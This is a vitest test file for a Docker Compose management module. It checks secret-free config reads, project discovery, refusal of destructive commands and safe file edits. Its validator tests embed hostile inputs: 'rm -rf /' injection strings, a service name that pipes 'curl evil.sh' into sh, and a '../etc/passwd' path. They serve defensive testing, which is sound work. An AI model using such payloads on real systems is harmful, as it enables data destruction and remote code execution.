import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { planJob, verifyJobApproval, jobApprovalFor } from '../src/shared/jobs'
import {
  COMPOSE_ACTIONS,
  COMPOSE_ENV_DISCLOSURE,
  COMPOSE_FILE_NAMES,
  COMPOSE_HEREDOC,
  COMPOSE_MARKERS,
  COMPOSE_REFUSALS,
  COMPOSE_SEARCH_MAX_DEPTH,
  COMPOSE_SEARCH_MAX_RESULTS,
  COMPOSE_SEARCH_ROOTS,
  applyComposeImageEdit,
  buildComposeActionCommand,
  buildComposeConfigCommand,
  buildComposeEnvNamesCommand,
  buildComposeListCommand,
  buildComposeReadCommand,
  buildComposeSearchCommand,
  buildComposeWriteCommand,
  composeJobSpec,
  composeRefusal,
  composeSearchBound,
  extractComposeVersion,
  joinComposeState,
  parseComposeConfigJson,
  parseComposeConfigOutput,
  parseComposeEnvNamesOutput,
  parseComposeListOutput,
  parseComposeProjectsJson,
  parseComposeProjectsTable,
  parseComposeSearchOutput,
  planComposeImageEdit,
  validateComposePath,
  validateComposeProject,
  validateImageRef,
  type ComposeImageEditPlan
} from '../src/shared/compose'
import type { DockerContainer } from '../src/shared/docker'

// Compose, the file half.
//
// Every fixture read here was RECORDED from Docker 29.5.3 / Compose v5.1.4 on a
// real multi-service project — see tests/fixtures/docker/README.md for what was
// recorded, what was sanitised and what could not be captured at all. The two
// `config` fixtures are a matched pair from the same project on the same run:
// one with the flags this module builds, one without them. The second is the
// evidence for the module's central rule, so it is asserted against rather than
// merely present.

const fixture = (name: string): string =>
  readFileSync(join(__dirname, 'fixtures', 'docker', name), 'utf8')

const SAFE_CONFIG = fixture('compose-config-safe-docker-29.json')
const INTERPOLATED_CONFIG = fixture('compose-config-interpolated-docker-29.json')
const LS_JSON = fixture('compose-ls-docker-29.json')
const LS_TABLE = fixture('compose-ls-docker-29.txt')
const LS_PARTIAL = fixture('compose-ls-partial-docker-29.txt')

// =====================================================================
// The rule: no environment value is ever read
// =====================================================================

describe('environment values', () => {
  it('the recorded unflagged config really does contain the secret', () => {
    // The premise of everything below. If docker ever stops doing this, the
    // flags this module passes stop being load-bearing and somebody should
    // find out from a failing test rather than from a code review.
    expect(INTERPOLATED_CONFIG).toContain('"REDIS_PASSWORD": "hunter2-not-a-real-password"')
    expect(INTERPOLATED_CONFIG).toContain('"WORKER_API_TOKEN": "tok-not-a-real-token"')
  })

  it('the flagged config leaves the variable name in place of the value', () => {
    expect(SAFE_CONFIG).toContain('"REDIS_PASSWORD": "${REDIS_PASSWORD}"')
    expect(SAFE_CONFIG).not.toContain('hunter2-not-a-real-password')
    // env_file is left as a PATH rather than inlined, which is the second half
    // of the protection: worker's token lives in worker.env, not in the model.
    expect(SAFE_CONFIG).not.toContain('tok-not-a-real-token')
    expect(SAFE_CONFIG).toContain('"path": "/srv/edge/worker.env"')
  })

  it('builds the config read with both flags, always', () => {
    const cmd = buildComposeConfigCommand({ name: 'edge', files: ['/srv/edge/compose.yaml'] })
    expect(cmd).toContain('--no-interpolate')
    expect(cmd).toContain('--no-env-resolution')
  })

  it('keeps no value even when the compose file hard-codes one', () => {
    // --no-interpolate does nothing about a literal. This is the case the
    // flags do NOT cover and the parser has to.
    const model = JSON.stringify({
      name: 'x',
      services: { api: { image: 'a:1', environment: { DB_PASSWORD: 'literal-secret-value' } } }
    })
    const cfg = parseComposeConfigJson(model)
    expect(JSON.stringify(cfg)).not.toContain('literal-secret-value')
    expect(cfg?.services[0].environment).toEqual([
      { name: 'DB_PASSWORD', origin: 'literal', set: true }
    ])
  })

  it('reads both environment shapes out of one recorded document', () => {
    // The recording has cache's environment as a MAP and gateway's as a LIST,
    // in the same render, because --no-interpolate only partially normalises.
    // A parser handling one shape reports the other service as having no
    // environment at all.
    const cfg = parseComposeConfigJson(SAFE_CONFIG)
    const cache = cfg?.services.find((s) => s.name === 'cache')
    const gateway = cfg?.services.find((s) => s.name === 'gateway')
    expect(cache?.environment).toEqual([
      { name: 'REDIS_PASSWORD', origin: 'interpolated', variable: 'REDIS_PASSWORD', set: true }
    ])
    expect(gateway?.environment).toEqual([{ name: 'UPSTREAM', origin: 'literal', set: true }])
  })

  it('marks a name with no value as passed through from the server', () => {
    const cfg = parseComposeConfigJson(
      JSON.stringify({ services: { api: { environment: { HOME: null, EMPTY: '' } } } })
    )
    expect(cfg?.services[0].environment).toEqual([
      { name: 'EMPTY', origin: 'literal', set: false },
      { name: 'HOME', origin: 'passthrough', set: false }
    ])
  })

  it('names the variable behind a default-valued interpolation', () => {
    const cfg = parseComposeConfigJson(
      JSON.stringify({ services: { api: { environment: { PORT: '${APP_PORT:-8080}' } } } })
    )
    expect(cfg?.services[0].environment[0]).toEqual({
      name: 'PORT',
      origin: 'interpolated',
      variable: 'APP_PORT',
      set: true
    })
  })
})

describe('.env files', () => {
  it('strips the value on the server, before it can cross the connection', () => {
    const cmd = buildComposeEnvNamesCommand(['/srv/edge/.env'])
    // The awk program prints a marker letter and a name. There is no field in
    // it that could hold a value.
    expect(cmd).toContain('index($0, "=")')
    expect(cmd).toContain('print (length($0) > i ? "S " : "E ") n')
    expect(cmd).not.toContain('$2')
  })

  it('refuses a path it cannot safely quote', () => {
    expect(() => buildComposeEnvNamesCommand(["/srv/edge/'; rm -rf / ;'.env"])).toThrow(
      /invalid path/
    )
    expect(() => buildComposeEnvNamesCommand(['relative/.env'])).toThrow(/invalid path/)
    expect(() => buildComposeEnvNamesCommand([])).toThrow(/no paths/)
  })

  it('reports set and empty without saying which value', () => {
    const out = [
      COMPOSE_MARKERS.envNames,
      'FILE /srv/edge/.env',
      'S REDIS_PASSWORD',
      'E OPTIONAL_FLAG',
      COMPOSE_MARKERS.end
    ].join('\n')
    expect(parseComposeEnvNamesOutput(out)).toEqual([
      {
        path: '/srv/edge/.env',
        readable: true,
        names: [
          { name: 'REDIS_PASSWORD', set: true },
          { name: 'OPTIONAL_FLAG', set: false }
        ]
      }
    ])
  })

  it('separates an unreadable file from an empty one', () => {
    const refused = [
      COMPOSE_MARKERS.envNames,
      'FILE /srv/edge/.env',
      'cat: /srv/edge/.env: Permission denied',
      COMPOSE_MARKERS.end
    ].join('\n')
    expect(parseComposeEnvNamesOutput(refused)[0]).toEqual({
      path: '/srv/edge/.env',
      readable: false,
      names: []
    })

    const empty = [COMPOSE_MARKERS.envNames, 'FILE /srv/edge/.env', COMPOSE_MARKERS.end].join('\n')
    expect(parseComposeEnvNamesOutput(empty)[0]).toEqual({
      path: '/srv/edge/.env',
      readable: true,
      names: []
    })
  })

  it('says on screen that values are withheld deliberately', () => {
    expect(COMPOSE_ENV_DISCLOSURE).toContain('never their values')
    expect(COMPOSE_ENV_DISCLOSURE).toContain('open the file on the server')
  })
})

// =====================================================================
// Discovery
// =====================================================================

describe('docker compose ls', () => {
  it('reads the recorded JSON listing, comma-joined config files and all', () => {
    const projects = parseComposeProjectsJson(LS_JSON)
    expect(projects).toEqual([
      {
        name: 'billing-stage-api',
        status: 'running(2)',
        running: 2,
        stopped: 0,
        configFiles: ['/srv/Ops Platform/billing/docker-compose.test.yml']
      },
      {
        name: 'edge',
        status: 'running(3)',
        running: 3,
        stopped: 0,
        configFiles: ['/srv/edge/compose.yaml', '/srv/edge/compose.override.yaml']
      },
      {
        name: 'blog-prod-eu-west-01',
        status: 'running(4)',
        running: 4,
        stopped: 0,
        configFiles: ['/opt/blog/docker/docker-compose.yml']
      }
    ])
  })

  it('reads the recorded table form, including a config path with a space in it', () => {
    const projects = parseComposeProjectsTable(LS_TABLE)
    expect(projects.map((p) => p.name)).toEqual(['billing-stage-api', 'edge', 'blog-prod-eu-west-01'])
    // A `split(/\s+/)` cuts this path in half at "Ops Platform".
    expect(projects[0].configFiles).toEqual(['/srv/Ops Platform/billing/docker-compose.test.yml'])
    expect(projects[1].configFiles).toEqual([
      '/srv/edge/compose.yaml',
      '/srv/edge/compose.override.yaml'
    ])
  })

  it('reads a compound status with a comma in it', () => {
    const projects = parseComposeProjectsTable(LS_PARTIAL)
    const edge = projects.find((p) => p.name === 'edge')
    expect(edge?.status).toBe('exited(1), running(2)')
    expect(edge?.running).toBe(2)
    expect(edge?.stopped).toBe(1)
  })

  it('passes --all, because compose hides stopped projects without it', () => {
    // Recorded: the same host reported edge as running(2) without --all and
    // exited(1), running(2) with it.
    expect(buildComposeListCommand()).toContain('compose ls --all --format json')
  })

  it('lets the optional blocks fail before the one whose exit code is read', () => {
    const cmd = buildComposeListCommand()
    const version = cmd.indexOf('compose version')
    const find = cmd.indexOf('find ')
    const ls = cmd.indexOf('compose ls')
    expect(version).toBeLessThan(ls)
    expect(find).toBeLessThan(ls)
    // The `ls` block does NOT end `|| true` — its exit status is the signal
    // separating "no compose here" from "no projects here".
    expect(cmd.slice(ls)).not.toContain('|| true')
  })
})

describe('the bounded filesystem search', () => {
  it('never searches from the root of the filesystem', () => {
    expect(COMPOSE_SEARCH_ROOTS).not.toContain('/')
    for (const root of COMPOSE_SEARCH_ROOTS) expect(root.length).toBeGreaterThan(1)
  })

  it('bounds depth, filesystem crossing and result count in the command itself', () => {
    const cmd = buildComposeSearchCommand()
    expect(cmd).toContain('-maxdepth 4')
    expect(cmd).toContain('-xdev')
    expect(cmd).toContain('head -n 200')
    expect(cmd).toContain('-name node_modules')
    expect(cmd).toContain('-prune')
    // -maxdepth is a global option; GNU find warns when it follows a test, and
    // a warning line inside this block is a path the parser cannot use.
    expect(cmd.indexOf('-maxdepth')).toBeLessThan(cmd.indexOf('-prune'))
  })

  it('reports its own bounds so an empty result can be read', () => {
    const bound = composeSearchBound()
    expect(bound.maxDepth).toBe(COMPOSE_SEARCH_MAX_DEPTH)
    expect(bound.maxResults).toBe(COMPOSE_SEARCH_MAX_RESULTS)
    expect(bound.crossesFilesystems).toBe(false)
    expect(bound.fileNames).toEqual(COMPOSE_FILE_NAMES)
  })

  it('keeps only the four names compose itself looks for', () => {
    const out = parseComposeSearchOutput(
      [
        '/srv/edge/compose.yaml',
        '/srv/edge/compose.override.yaml',
        '/opt/blog/docker/docker-compose.yml',
        '/srv/notes.txt'
      ].join('\n')
    )
    expect(out.files.map((f) => f.path)).toEqual([
      '/opt/blog/docker/docker-compose.yml',
      '/srv/edge/compose.yaml'
    ])
    expect(out.files[0].directory).toBe('/opt/blog/docker')
    expect(out.files[0].fileName).toBe('docker-compose.yml')
    expect(out.truncated).toBe(false)
  })

  it('says when the cap cut the list off', () => {
    const many = Array.from({ length: 200 }, (_, i) => `/srv/p${i}/compose.yaml`).join('\n')
    expect(parseComposeSearchOutput(many).truncated).toBe(true)
  })
})

describe('parseComposeListOutput', () => {
  const wrap = (parts: Record<string, string>): string =>
    [
      COMPOSE_MARKERS.version,
      parts.version ?? 'v2.29.7',
      COMPOSE_MARKERS.find,
      parts.find ?? '',
      COMPOSE_MARKERS.ls,
      parts.ls ?? '[]',
      COMPOSE_MARKERS.end
    ].join('\n')

  it('reads the version, the projects and the search in one round trip', () => {
    const probe = parseComposeListOutput(
      wrap({ find: '/srv/edge/compose.yaml', ls: LS_JSON }),
      0
    )
    expect(probe.ok).toBe(true)
    if (!probe.ok) return
    expect(probe.composeVersion).toBe('2.29.7')
    expect(probe.projects.map((p) => p.name)).toEqual([
      'billing-stage-api',
      'edge',
      'blog-prod-eu-west-01'
    ])
    expect(probe.search?.files.map((f) => f.path)).toEqual(['/srv/edge/compose.yaml'])
    expect(probe.projectsFrom).toBe('compose-ls')
  })

  it('keeps a missing compose plugin as a readable answer, not a failed read', () => {
    const probe = parseComposeListOutput(
      wrap({
        find: '/srv/edge/docker-compose.yml',
        ls: "docker: 'compose' is not a docker command.\nSee 'docker --help'"
      }),
      1
    )
    expect(probe.ok).toBe(true)
    if (!probe.ok) return
    expect(probe.projectsFrom).toBe('unavailable')
    expect(probe.projects).toEqual([])
    // The files are still the answer to "what compose projects live here".
    expect(probe.search?.files.map((f) => f.path)).toEqual(['/srv/edge/docker-compose.yml'])
  })

  it('reports a refused socket as a refused socket, not as an empty server', () => {
    const probe = parseComposeListOutput(
      wrap({ ls: 'permission denied while trying to connect to the Docker daemon socket' }),
      1
    )
    expect(probe.ok).toBe(false)
    if (probe.ok) return
    expect(probe.reason).toBe('permission-denied')
  })

  it('reports a server with no docker at all rather than a server with no projects', () => {
    const probe = parseComposeListOutput(
      [COMPOSE_MARKERS.version, 'sh: 1: docker: not found'].join('\n'),
      127
    )
    expect(probe.ok).toBe(false)
    if (probe.ok) return
    expect(probe.reason).toBe('not-installed')
  })

  it('reads an empty project list as an empty project list', () => {
    const probe = parseComposeListOutput(wrap({ ls: '[]' }), 0)
    expect(probe.ok).toBe(true)
    if (!probe.ok) return
    expect(probe.projects).toEqual([])
    expect(probe.projectsFrom).toBe('compose-ls')
  })

  it('extracts a version from either wording', () => {
    expect(extractComposeVersion('v2.29.7')).toBe('2.29.7')
    expect(extractComposeVersion('Docker Compose version v5.1.4')).toBe('5.1.4')
    expect(extractComposeVersion('')).toBe(null)
  })
})

// =====================================================================
// Declared services
// =====================================================================

describe('parseComposeConfigOutput', () => {
  const wrap = (config: string, services: string): string =>
    [
      COMPOSE_MARKERS.config,
      config,
      COMPOSE_MARKERS.services,
      services,
      COMPOSE_MARKERS.end
    ].join('\n')

  it('reads the recorded project: three services, images, ports, depends_on', () => {
    const probe = parseComposeConfigOutput(wrap(SAFE_CONFIG, 'cache\ngateway\nworker'), 0)
    expect(probe.ok).toBe(true)
    if (!probe.ok) return
    expect(probe.config.name).toBe('edge')
    expect(probe.config.namesOnly).toBe(false)
    expect(probe.config.services.map((s) => s.name)).toEqual(['cache', 'gateway', 'worker'])
    expect(probe.config.services.map((s) => s.image)).toEqual([
      'redis:7.2-alpine',
      'nginx:1.27-alpine',
      'busybox:1.36'
    ])
    const gateway = probe.config.services[1]
    expect(gateway.containerName).toBe('edge-gateway-pinned')
    expect(gateway.dependsOn).toEqual(['cache'])
    expect(gateway.ports).toEqual(['18080:80'])
    expect(probe.config.volumes).toEqual(['cachedata'])
    expect(probe.config.services[2].envFiles).toEqual(['/srv/edge/worker.env'])
  })

  it('falls back to names when the JSON form is not supported', () => {
    // CONSTRUCTED, not recorded: no engine old enough to reject `--format
    // json` was available, so the refusal line is invented. What is real is
    // that the JSON block is built with `|| true` ahead of the block whose
    // exit status is read, which is what makes this path reachable at all.
    const probe = parseComposeConfigOutput(
      wrap('unknown flag: --format', 'cache\ngateway\nworker'),
      0
    )
    expect(probe.ok).toBe(true)
    if (!probe.ok) return
    expect(probe.config.namesOnly).toBe(true)
    expect(probe.config.services.map((s) => s.name)).toEqual(['cache', 'gateway', 'worker'])
    expect(probe.config.services[0].image).toBe(null)
  })

  it('reports a refused read rather than a project that declares nothing', () => {
    const probe = parseComposeConfigOutput(
      wrap('', 'permission denied while trying to connect to the Docker daemon socket'),
      1
    )
    expect(probe.ok).toBe(false)
    if (probe.ok) return
    expect(probe.reason).toBe('permission-denied')
  })

  it('reports a shell that never reached the services block', () => {
    const probe = parseComposeConfigOutput(
      [COMPOSE_MARKERS.config, 'sh: 1: docker: not found'].join('\n'),
      127
    )
    expect(probe.ok).toBe(false)
    if (probe.ok) return
    expect(probe.reason).toBe('not-installed')
  })

  it('marks a build-only service as having nothing to pull', () => {
    const probe = parseComposeConfigOutput(
      wrap(JSON.stringify({ services: { api: { build: { context: '.' } } } }), 'api'),
      0
    )
    expect(probe.ok).toBe(true)
    if (!probe.ok) return
    expect(probe.config.services[0]).toMatchObject({ image: null, build: true })
  })
})

describe('joinComposeState', () => {
  const container = (over: Partial<DockerContainer>): DockerContainer => ({
    id: 'a'.repeat(64),
    shortId: 'a'.repeat(12),
    name: 'edge-cache-1',
    image: 'redis:7.2-alpine',
    state: 'running',
    status: 'Up 2 minutes',
    ports: '',
    createdAt: '2026-09-03 12:56:42 +0400 +04',
    composeProject: 'edge',
    composeService: 'cache',
    ...over
  })

  const config = parseComposeConfigJson(SAFE_CONFIG)!

  it('names the declared service with no container at all', () => {
    const view = joinComposeState('edge', config, [
      container({}),
      container({ name: 'edge-gateway-pinned', composeService: 'gateway' })
    ])
    // `worker` is declared and has never been created. This is the fact the
    // container panel cannot state, because there is no container to list.
    expect(view.missing).toEqual(['worker'])
    expect(view.services.find((s) => s.declared.name === 'worker')?.state).toBe('missing')
  })

  it('separates stopped from missing', () => {
    const view = joinComposeState('edge', config, [
      container({ name: 'edge-worker-1', composeService: 'worker', state: 'exited' })
    ])
    expect(view.services.find((s) => s.declared.name === 'worker')?.state).toBe('stopped')
    expect(view.missing).toEqual(['cache', 'gateway'])
  })

  it('calls a partly-up scaled service partial', () => {
    const view = joinComposeState('edge', config, [
      container({ name: 'edge-cache-1' }),
      container({ name: 'edge-cache-2', state: 'exited' })
    ])
    expect(view.services.find((s) => s.declared.name === 'cache')?.state).toBe('partial')
  })

  it('lists a running container the file does not declare', () => {
    const view = joinComposeState('edge', config, [
      container({ name: 'edge-legacy-1', composeService: 'legacy' })
    ])
    expect(view.undeclared.map((c) => c.name)).toEqual(['edge-legacy-1'])
  })

  it('ignores containers belonging to another project', () => {
    const view = joinComposeState('edge', config, [
      container({ name: 'blog-cache-1', composeProject: 'blog-prod-eu-west-01' })
    ])
    expect(view.undeclared).toEqual([])
    expect(view.missing).toEqual(['cache', 'gateway', 'worker'])
  })
})

// =====================================================================
// Jobs, and what is refused
// =====================================================================

describe('what compose will not run', () => {
  it('refuses down in writing, with the reason', () => {
    expect(composeRefusal('down')).toContain('removes every container in the project')
    expect(composeRefusal('down -v')).toContain('deletes the project')
    expect(composeRefusal('kill')).toContain('SIGKILL')
    expect(composeRefusal('pull')).toBe(null)
    expect(composeRefusal('up')).toBe(null)
  })

  it('refuses to build a down command even when asked directly', () => {
    expect(() =>
      buildComposeActionCommand('down' as never, { name: 'edge', files: ['/srv/edge/compose.yaml'] })
    ).toThrow(/removes every container/)
  })

  it('offers exactly two verbs', () => {
    expect(COMPOSE_ACTIONS).toEqual(['pull', 'up'])
    for (const verb of Object.keys(COMPOSE_REFUSALS)) {
      expect(COMPOSE_ACTIONS).not.toContain(verb)
    }
  })

  it('does not add flags that remove or restart things nobody asked about', () => {
    const cmd = buildComposeActionCommand('up', { name: 'edge', files: ['/srv/edge/compose.yaml'] })
    expect(cmd).toContain('up -d')
    expect(cmd).not.toContain('--remove-orphans')
    expect(cmd).not.toContain('--force-recreate')
    expect(cmd).not.toContain('--build')
  })
})

describe('compose commands', () => {
  const project = { name: 'edge', files: ['/srv/edge/compose.yaml', '/srv/edge/compose.override.yaml'] }

  it('names the project explicitly rather than letting compose infer it', () => {
    expect(buildComposeActionCommand('pull', project)).toBe(
      "docker compose --project-name 'edge' -f '/srv/edge/compose.yaml' -f '/srv/edge/compose.override.yaml' pull"
    )
  })

  it('quotes a path with a space in it, because a real one has one', () => {
    expect(
      buildComposeActionCommand('pull', {
        name: 'billing-stage-api',
        files: ['/srv/Ops Platform/billing/docker-compose.test.yml']
      })
    ).toContain("-f '/srv/Ops Platform/billing/docker-compose.test.yml'")
  })

  it('refuses everything it cannot prove safe', () => {
    expect(() => buildComposeActionCommand('pull', { name: 'edge', files: [] })).toThrow(
      /no compose file/
    )
    expect(() =>
      buildComposeActionCommand('pull', { name: "edge'; rm -rf /", files: ['/srv/a/compose.yaml'] })
    ).toThrow(/invalid project name/)
    expect(() =>
      buildComposeActionCommand('pull', { name: 'edge', files: ["/srv/a'; rm -rf /"] })
    ).toThrow(/invalid file path/)
    expect(() =>
      buildComposeActionCommand('up', project, { services: ['api; curl evil.sh | sh'] })
    ).toThrow(/invalid service name/)
    expect(() =>
      buildComposeActionCommand('pull', {
        name: 'edge',
        files: Array.from({ length: 11 }, (_, i) => `/srv/edge/c${i}.yaml`)
      })
    ).toThrow(/more than 10 files/)
  })

  it('accepts a path with a space and refuses one with a quote or a newline', () => {
    expect(validateComposePath('/srv/Ops Platform/billing/docker-compose.test.yml')).toBe(true)
    expect(validateComposePath("/srv/a'.yaml")).toBe(false)
    expect(validateComposePath('/srv/a\n.yaml')).toBe(false)
    expect(validateComposePath('srv/a.yaml')).toBe(false)
    expect(validateComposePath(42)).toBe(false)
  })

  it('holds compose to its own project-name grammar', () => {
    expect(validateComposeProject('edge')).toBe(true)
    expect(validateComposeProject('blog-prod-eu-west-01')).toBe(true)
    expect(validateComposeProject('Edge')).toBe(false)
    expect(validateComposeProject('-edge')).toBe(false)
  })
})

describe('compose as a job', () => {
  const project = { name: 'edge', files: ['/srv/edge/compose.yaml'] }

  it('produces a JobSpec the existing engine can plan and verify', () => {
    const plan = composeJobSpec('up', project)
    expect(plan.spec.steps).toHaveLength(1)
    expect(plan.spec.steps[0].command).toBe(
      "docker compose --project-name 'edge' -f '/srv/edge/compose.yaml' up -d"
    )
    const targets = [{ serverId: 's1', serverName: 'edge-01' }]
    const approval = jobApprovalFor(plan.spec, targets, { confirmedAt: 1_700_000_000_000 })
    expect(verifyJobApproval(approval, plan.spec, targets).ok).toBe(true)
  })

  it('refuses a record minted for a different project', () => {
    const targets = [{ serverId: 's1', serverName: 'edge-01' }]
    const approved = composeJobSpec('up', project)
    const substituted = composeJobSpec('up', { name: 'blog-prod-eu-west-01', files: ['/opt/blog/docker/docker-compose.yml'] })
    const approval = jobApprovalFor(approved.spec, targets, { confirmedAt: 1_700_000_000_000 })
    expect(verifyJobApproval(approval, substituted.spec, targets).ok).toBe(false)
  })

  it('keeps pull and up as separate jobs', () => {
    // One spec with both steps would mint one approval record describing two
    // different blast radii, and a failure at step two would leave a host in a
    // state that record does not describe.
    expect(composeJobSpec('pull', project).spec.steps).toHaveLength(1)
    expect(composeJobSpec('up', project).spec.steps).toHaveLength(1)
  })

  it('gives a pull long enough to finish a large image', () => {
    expect(composeJobSpec('pull', project).spec.steps[0].timeoutMs).toBe(1_800_000)
  })

  it('grades up -d no lower than ordinary and never as a reboot', () => {
    const plan = planJob(composeJobSpec('up', project).spec, [
      { serverId: 's1', serverName: 'edge-01' }
    ])
    expect(plan.reasons).not.toContain('a step in this job restarts the machine')
    expect(plan.totalHosts).toBe(1)
  })
})

// =====================================================================
// The image tag edit
// =====================================================================

const FILE = [
  '# the edge stack',
  'services:',
  '  gateway:',
  '    # pinned deliberately, see INC-4471',
  '    image: nginx:1.27-alpine',
  '    ports:',
  '      - "18080:80"',
  '  cache:',
  '    image: "redis:7.2-alpine"',
  '  builder:',
  '    build:',
  '      context: .',
  '      image: scratch:ignored',
  'volumes:',
  '  cachedata:',
  ''
].join('\n')

describe('planComposeImageEdit', () => {
  it('finds the one line and leaves the comment on it alone', () => {
    const plan = planComposeImageEdit(FILE, 'gateway', 'nginx:1.29-alpine')
    expect(plan.ok).toBe(true)
    if (!plan.ok) return
    expect(plan.line).toBe(5)
    expect(plan.from).toBe('nginx:1.27-alpine')
    expect(plan.after).toBe('    image: nginx:1.29-alpine')
  })

  it('keeps the quoting the file already used', () => {
    const plan = planComposeImageEdit(FILE, 'cache', 'redis:7.4-alpine')
    expect(plan.ok).toBe(true)
    if (!plan.ok) return
    expect(plan.after).toBe('    image: "redis:7.4-alpine"')
  })

  it('rewrites exactly one line and touches nothing else', () => {
    const plan = planComposeImageEdit(FILE, 'gateway', 'nginx:1.29-alpine')
    const out = applyComposeImageEdit(FILE, plan)
    const before = FILE.split('\n')
    const after = out.split('\n')
    expect(after).toHaveLength(before.length)
    const changed = after.filter((l, i) => l !== before[i])
    expect(changed).toEqual(['    image: nginx:1.29-alpine'])
    // The comments a stack's only documentation lives in survive.
    expect(out).toContain('# pinned deliberately, see INC-4471')
    expect(out).toContain('# the edge stack')
  })

  it('does not touch an image key nested inside another block', () => {
    const plan = planComposeImageEdit(FILE, 'builder', 'busybox:1.37')
    expect(plan.ok).toBe(false)
    if (plan.ok) return
    expect(plan.reason).toContain('declares no image')
  })

  it('says which of the two ways it could not find the service', () => {
    const missing = planComposeImageEdit(FILE, 'nope', 'busybox:1.37')
    expect(missing.ok).toBe(false)
    if (missing.ok) return
    expect(missing.reason).toContain('not declared in this file')
  })

  it('refuses an image reference it cannot prove is one', () => {
    for (const bad of ['nginx:1.27 alpine', 'nginx:', '../etc/passwd', 'nginx:a/b']) {
      const plan = planComposeImageEdit(FILE, 'gateway', bad)
      expect(plan.ok, bad).toBe(false)
    }
    expect(validateImageRef('registry.example.com:5000/team/api:v1.2.3')).toBe(true)
    expect(validateImageRef('nginx@sha256:' + 'a'.repeat(64))).toBe(true)
  })

  it('refuses to apply onto a file that has changed underneath it', () => {
    const plan = planComposeImageEdit(FILE, 'gateway', 'nginx:1.29-alpine')
    const moved = FILE.replace('# the edge stack\n', '')
    expect(() => applyComposeImageEdit(moved, plan)).toThrow(/has changed since it was planned/)
  })

  it('refuses to apply a plan that failed', () => {
    const plan: ComposeImageEditPlan = { ok: false, reason: 'no' }
    expect(() => applyComposeImageEdit(FILE, plan)).toThrow(/was not planned/)
  })
})

describe('writing the file back', () => {
  it('backs up, writes a temp and moves it into place', () => {
    const cmd = buildComposeWriteCommand('/srv/edge/compose.yaml', 'services: {}\n')
    expect(cmd).toContain("cp -p '/srv/edge/compose.yaml' '/srv/edge/compose.yaml.shellpilot-bak'")
    expect(cmd).toContain("tee '/srv/edge/compose.yaml.shellpilot-tmp'")
    expect(cmd).toContain("mv '/srv/edge/compose.yaml.shellpilot-tmp' '/srv/edge/compose.yaml'")
    // && between every stage: a failed backup must not be followed by a write.
    expect(cmd.split(' && ').length).toBeGreaterThanOrEqual(4)
  })

  it('quotes the heredoc delimiter so file content cannot become shell', () => {
    const cmd = buildComposeWriteCommand('/srv/edge/compose.yaml', 'x: ${NOT_EXPANDED}\n')
    expect(cmd).toContain(`<<'${COMPOSE_HEREDOC}'`)
    expect(cmd).toContain('x: ${NOT_EXPANDED}')
  })

  it('refuses content that could end the heredoc early', () => {
    expect(() =>
      buildComposeWriteCommand('/srv/edge/compose.yaml', `a: 1\n${COMPOSE_HEREDOC}\nb: 2\n`)
    ).toThrow(/heredoc delimiter/)
  })

  it('refuses a path or a size it will not write', () => {
    expect(() => buildComposeWriteCommand("/srv/a'.yaml", 'x')).toThrow(/invalid compose file path/)
    expect(() => buildComposeWriteCommand('/srv/a.yaml', 'x'.repeat(600_000))).toThrow(/larger than/)
  })

  it('bounds the read too', () => {
    expect(buildComposeReadCommand('/srv/edge/compose.yaml')).toBe(
      "head -c 524288 '/srv/edge/compose.yaml' 2>&1"
    )
    expect(() => buildComposeReadCommand('relative.yaml')).toThrow(/invalid compose file path/)
  })
})
